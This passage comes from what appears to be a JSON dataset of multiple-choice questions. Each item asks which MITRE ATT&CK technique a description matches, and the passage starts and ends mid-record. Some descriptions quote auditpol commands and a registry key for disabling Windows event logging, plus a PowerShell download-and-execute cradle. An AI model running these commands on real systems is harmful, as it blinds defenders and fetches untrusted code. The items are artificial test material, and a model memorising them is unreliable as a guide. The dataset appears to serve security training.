<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
      "options": "A. Cloud Administration Command, B. Impair Defenses: Disable Windows Event Logging, C. Endpoint Denial of Service: Service Exhaustion Flood, D. Exploitation of Remote Services",
      "choice": "B. Impair Defenses: Disable Windows Event Logging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.\n\nPossible answers:\nA. Process Injection: ListPlanting, B. Data Destruction, C. Ingress Tool Transfer, D. Data Obfuscation: Steganography",
    "context": "",
    "output": "C. Ingress Tool Transfer",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "options": "A. Process Injection: ListPlanting, B. Data Destruction, C. Ingress Tool Transfer, D. Data Obfuscation: Steganography",
      "choice": "C. Ingress Tool Transfer",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.\n\nOptions:\nA. Financial Theft, B. Command and Scripting Interpreter: PowerShell, C. Data Encrypted for Impact, D. Hide Artifacts: Hidden Files and Directories",
    "context": "",
    "output": "D. Hide Artifacts: Hidden Files and Directories",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
      "options": "A. Financial Theft, B. Command and Scripting Interpreter: PowerShell, C. Data Encrypted for Impact, D. Hide Artifacts: Hidden Files and Directories",
      "choice": "D. Hide Artifacts: Hidden Files and Directories",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.\nA. Obfuscated Files or Information: Encrypted/Encoded File, B. Modify Cloud Compute Infrastructure: Create Cloud Instance, C. Debugger Evasion, D. Data from Configuration Repository: Network Device Configuration Dump\nAnswer:",
    "context": "",
    "output": "A. Obfuscated Files or Information: Encrypted/Encoded File",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "options": "A. Obfuscated Files or Information: Encrypted/Encoded File, B. Modify Cloud Compute Infrastructure: Create Cloud Instance, C. Debugger Evasion, D. Data from Configuration Repository: Network Device Configuration Dump",
      "choice": "A. Obfuscated Files or Information: Encrypted/Encoded File",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\n\nPossible answers:\nA. Command and Scripting Interpreter: Python, B. Search Open Websites/Domains: Search Engines, C. Event Triggered Execution: Component Object Model Hijacking, D. Office Application Startup: Add-ins",
    "context": "",
    "output": "A. Command and Scripting Interpreter: Python",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
      "options": "A. Command and Scripting Interpreter: Python, B. Search Open Websites/Domains: Search Engines, C. Event Triggered Execution: Component Object Model Hijacking, D. Office Application Startup: Add-ins",
      "choice": "A. Command and Scripting Interpreter: Python",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.\n\nOptions:\nA. Proxy: Multi-hop Proxy, B. Device Driver Discovery, C. Supply Chain Compromise: Compromise Software Dependencies and Development Tools, D. Network Denial of Service: Direct Network Flood",
    "context": "",
    "output": "D. Network Denial of Service: Direct Network Flood",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.",
      "options": "A. Proxy: Multi-hop Proxy, B. Device Driver Discovery, C. Supply Chain Compromise: Compromise Software Dependencies and Development Tools, D. Network Denial of Service: Direct Network Flood",
      "choice": "D. Network Denial of Service: Direct Network Flood",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks. \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent\n\nOptions:\nA. Proxy, B. Event Triggered Execution: Trap, C. Obfuscated Files or Information: Stripped Payloads, D. Boot or Logon Initialization Scripts: Login Hook",
    "context": "",
    "output": "D. Boot or Logon Initialization Scripts: Login Hook",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks. \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent",
      "options": "A. Proxy, B. Event Triggered Execution: Trap, C. Obfuscated Files or Information: Stripped Payloads, D. Boot or Logon Initialization Scripts: Login Hook",
      "choice": "D. Boot or Logon Initialization Scripts: Login Hook",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust the technique can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage the technique for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.\nA. Hijack Execution Flow: Executable Installer File Permissions Weakness, B. Acquire Infrastructure: Malvertising, C. Event Triggered Execution: AppInit DLLs, D. Hardware Additions",
    "context": "",
    "output": "D. Hardware Additions",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust the technique can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage the technique for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.",
      "options": "A. Hijack Execution Flow: Executable Installer File Permissions Weakness, B. Acquire Infrastructure: Malvertising, C. Event Triggered Execution: AppInit DLLs, D. Hardware Additions",
      "choice": "D. Hardware Additions",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.\n\nA. Obfuscated Files or Information: Software Packing, B. Phishing: Spearphishing Link, C. Obtain Capabilities: Code Signing Certificates, D. Data from Removable Media\nAnswer:",
    "context": "",
    "output": "B. Phishing: Spearphishing Link",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
      "options": "A. Obfuscated Files or Information: Software Packing, B. Phishing: Spearphishing Link, C. Obtain Capabilities: Code Signing Certificates, D. Data from Removable Media",
      "choice": "B. Phishing: Spearphishing Link",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may access the technique.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the Cloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., Data from Information Repositories). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.\nA. Plist File Modification, B. Data from Cloud Storage, C. Peripheral Device Discovery, D. Data Staged: Local Data Staging",
    "context": "",
    "output": "B. Data from Cloud Storage",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may access the technique.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the Cloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., Data from Information Repositories). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
      "options": "A. Plist File Modification, B. Data from Cloud Storage, C. Peripheral Device Discovery, D. Data Staged: Local Data Staging",
      "choice": "B. Data from Cloud Storage",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.\n\nPossible answers:\nA. Access Token Manipulation: Token Impersonation/Theft, B. System Binary Proxy Execution: MMC, C. Supply Chain Compromise: Compromise Hardware Supply Chain, D. Hijack Execution Flow: AppDomainManager",
    "context": "",
    "output": "A. Access Token Manipulation: Token Impersonation/Theft",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",
      "options": "A. Access Token Manipulation: Token Impersonation/Theft, B. System Binary Proxy Execution: MMC, C. Supply Chain Compromise: Compromise Hardware Supply Chain, D. Hijack Execution Flow: AppDomainManager",
      "choice": "A. Access Token Manipulation: Token Impersonation/Theft",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for The technique is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for The technique and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents. Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.\nA. Access Token Manipulation: Make and Impersonate Token, B. Resource Hijacking, C. System Binary Proxy Execution: Verclsid, D. Scheduled Task/Job: At\nAnswer:",
    "context": "",
    "output": "B. Resource Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for The technique is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for The technique and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents. Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.",
      "options": "A. Access Token Manipulation: Make and Impersonate Token, B. Resource Hijacking, C. System Binary Proxy Execution: Verclsid, D. Scheduled Task/Job: At",
      "choice": "B. Resource Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing. For example, PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected.\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.\n\nOptions:\nA. Archive Collected Data: Archive via Utility, B. Impair Defenses: Downgrade Attack, C. Hijack Execution Flow: COR_PROFILER, D. Boot or Logon Initialization Scripts: Network Logon Script",
    "context": "",
